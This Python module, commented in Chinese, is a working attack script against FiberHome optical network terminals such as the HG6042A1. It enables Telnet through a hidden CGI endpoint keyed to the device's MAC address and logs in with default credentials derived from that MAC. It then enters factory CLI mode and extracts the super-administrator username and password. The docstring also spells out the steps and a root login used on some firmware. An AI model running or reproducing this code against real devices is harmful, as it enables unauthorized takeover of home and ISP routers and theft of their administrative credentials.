# -*- coding: utf-8 -*-
"""烽火（FiberHome）光猫：开启 Telnet 并读取超级管理员密码。

适用：HG6042A1 等烽火 ONT（移动定制居多）。

成功案例（公开实操）：
  https://blog.iafan.com/post-6.html  《烽火光猫HG6042A1/破解超级密码/开启Telnet》

流程：
  1. 用设备 MAC（大写、去分隔符）开启 Telnet：
       http://<ip>:8080/cgi-bin/telnetenable.cgi?telnetenable=1&key=<MAC>
  2. Telnet 登录：admin / Fh@<MAC 后六位大写>
  3. 进入命令行后：
       load_cli factory
       show admin_name
       show admin_pwd
  4. 若需 su：root / hg2x0（部分固件）
"""
import re

from .core import Http, Telnet, log


class FiberHome:
    def __init__(self, ip, port=8080, timeout=8):
        self.ip = ip
        self.port = port
        self.http = Http("http://%s:%d" % (ip, port), timeout)

    @staticmethod
    def normalize_mac(mac):
        """接受 AA:BB:CC:DD:EE:FF / aa-bb-... / 无分隔，统一成大写 12 位。"""
        hexonly = re.sub(r"[^0-9A-Fa-f]", "", mac)
        if len(hexonly) != 12:
            raise ValueError("MAC 需要 12 位十六进制，收到 %r" % mac)
        return hexonly.upper()

    def enable_telnet(self, mac):
        key = self.normalize_mac(mac)
        url = "/cgi-bin/telnetenable.cgi?telnetenable=1&key=%s" % key
        try:
            body, st = self.http.get(url)
        except Exception as e:
            log("WARN", "telnetenable.cgi 请求失败: %s" % e)
            return False
        text = re.sub(r"<[^>]+>", " ", body or "").strip()
        log("HTTP", "%s → %d %s" % (url, st, (text[:60] or "空响应")))
        return st == 200

    @staticmethod
    def default_password(mac):
        return "Fh@" + FiberHome.normalize_mac(mac)[-6:]

    def login(self, mac):
        user = "admin"
        pw = self.default_password(mac)
        tn = Telnet(self.ip, 23)
        if tn.login(user, [pw]):
            log("AUTH", "Telnet %s / %s 登录成功" % (user, pw))
            return tn
        tn.close()
        log("WARN", "Telnet 默认凭据被拒（%s / %s）" % (user, pw))
        return None

    def read_super_password(self, tn):
        """load_cli factory 后读取超管账号密码。"""
        tn.send("load_cli factory")
        tn.read_for(1.5)
        name = self._query(tn, "show admin_name")
        pwd = self._query(tn, "show admin_pwd")
        if pwd:
            log("DATA", "超管账号 %s / %s" % (name or "telecomadmin", pwd))
        else:
            log("WARN", "未能读取 admin_pwd，可能固件不支持 factory 模式")
        return name, pwd

    @staticmethod
    def _query(tn, cmd):
        tn.send(cmd)
        out = tn.read_for(1.5)
        # 取最后一行非提示符内容
        for line in reversed(out.splitlines()):
            s = line.strip()
            if not s or s.endswith("#") or s.endswith(">") or cmd in s:
                continue
            m = re.search(r"[:=]\s*(\S+)", s)
            return (m.group(1) if m else s)
        return ""

    def run(self, mac):
        log("INFO", "烽火流程  目标 %s:%d  MAC=%s" % (self.ip, self.port, mac))
        self.enable_telnet(mac)
        tn = self.login(mac)
        if not tn:
            return None
        try:
            return self.read_super_password(tn)
        finally:
            tn.close()
